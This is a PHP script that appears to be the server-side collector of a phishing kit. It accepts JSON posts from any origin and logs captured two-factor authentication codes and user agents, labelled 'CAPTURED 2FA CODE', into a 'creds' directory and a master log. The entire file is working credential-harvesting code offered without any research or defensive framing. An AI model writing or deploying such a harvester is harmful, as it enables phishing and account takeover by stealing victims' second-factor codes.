<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    // Create creds directory if it doesn't exist
    $credsDir = dirname(__DIR__) . '/creds';
    if (!file_exists($credsDir)) {
        mkdir($credsDir, 0755, true);
    }
    
    // Generate unique filename with timestamp
    $timestamp = date('Y-m-d_H-i-s');
    $filename = $credsDir . '/2fa_code_' . $timestamp . '.txt';
    
    $logEntry = sprintf(
        "═══════════════════════════════════════════════════════════════\n" .
        "CAPTURED 2FA CODE\n" .
        "═══════════════════════════════════════════════════════════════\n" .
        "Timestamp:    %s\n" .
        "2FA Code:     %s\n" .
        "User-Agent:   %s\n" .
        "═══════════════════════════════════════════════════════════════\n\n",
        date('Y-m-d H:i:s'),
        $data['code'],
        $data['userAgent']
    );
    
    file_put_contents($filename, $logEntry);
    
    // Also append to master log file
    $masterLog = $credsDir . '/all_2fa_codes.log';
    file_put_contents($masterLog, $logEntry, FILE_APPEND);
    
    error_log("CAPTURED 2FA CODE: " . $data['code']);
    
    echo json_encode(['status' => 'success']);
} else {
    echo json_encode(['status' => 'error']);
}
?>
